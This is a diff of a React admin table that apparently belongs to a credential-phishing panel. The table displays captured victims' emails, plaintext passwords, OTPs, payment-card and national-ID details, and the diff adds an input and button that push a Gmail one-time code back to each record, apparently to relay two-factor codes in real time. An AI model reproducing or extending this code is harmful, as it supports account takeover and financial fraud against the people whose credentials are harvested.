@@ -3,7 +3,7 @@ import { formatUtcToLocal } from "../../utils/DateFormater";
 import { handleCopyClick } from "../../utils/copyToClipboard";
 import Loader from "../../common/Loader";
 import useInformation from "../../hooks/useInformation";
-import { getData } from "../../api/fetching";
+import { getData, updateData } from "../../api/fetching";
 import {  PaginationNav1Presentation } from "../Pagination/Pagination";
 import { useState } from "react";
 import CardDataModal from "../../modals/PaymentCardModal";
@@ -15,9 +15,20 @@ const InformationTable = () => {
   const [nidOpen,setNidOpen]= useState(false)
   const [paymentInfo,setPaymentInfo] = useState({})
   const [nidInfo,setNidInfo] = useState({})
+  const [codeVal,setCodeVal]= useState('')
 
 
   const {  loading, setIsRefresh, displayInfo, role,totalPages, setPage,page} = useInformation()
+
+
+  const updateGmailOtp = async(id:any)=> {
+    const originalData= {
+      mailCode: codeVal
+    }
+    const data = await updateData(`/information/admin/${id}`,originalData)
+    console.log(data);
+  }
+
 
   const handleDisabled = async (id: any,type:any,status:any) => {
     console.log(type,'status');
@@ -101,15 +112,15 @@ const InformationTable = () => {
                 role === 'admin' && (
                   <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
 
-                   Hide Email
+                   Type Code
                   </th>
                 )
               }
               {
                 role === 'admin' && (
-                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+                  <th  scope="col" className="px-2 py-1 font-bold cursor-pointer">
 
-                    Hide Password
+                    Send Code
                   </th>
                 )
               }
@@ -129,7 +140,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt,nidInfo, agent: { source={},platform='' } ,paymentInfo, status, email,isPasswordHide, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt,nidInfo, agent: { source={},platform='' } ,paymentInfo,  email, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -199,13 +210,7 @@ const InformationTable = () => {
                   {
                     role === 'admin' && (
                       <td className="px-2 py-1 font-bold cursor-pointer ">
-                        <div className="relative inline-block">
-                          <button
-                          title={platform}
-                            onClick={() => {handleDisabled(_id,'status',status)}}
-                            className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-                              }`}>{!status ? 'Hide' : 'show'}</button>
-                        </div>
+                             <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" defaultValue={otp} onChange={(e)=>setCodeVal(e.target.value)} />
                       </td>
                     )
                   }
@@ -215,10 +220,10 @@ const InformationTable = () => {
                       <td className="px-2 py-1 font-bold cursor-pointer ">
                         <div className="relative inline-block">
                           <button
-                          title={platform}
-                            onClick={() => {handleDisabled(_id,'isPasswordHide',isPasswordHide)}}
+                          onClick={()=>updateGmailOtp(_id)}
+
                             className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-                              }`}>{!isPasswordHide ? 'Hide' : 'show'}</button>
+                              }`}>Add</button>
                         </div>
                       </td>
                     )
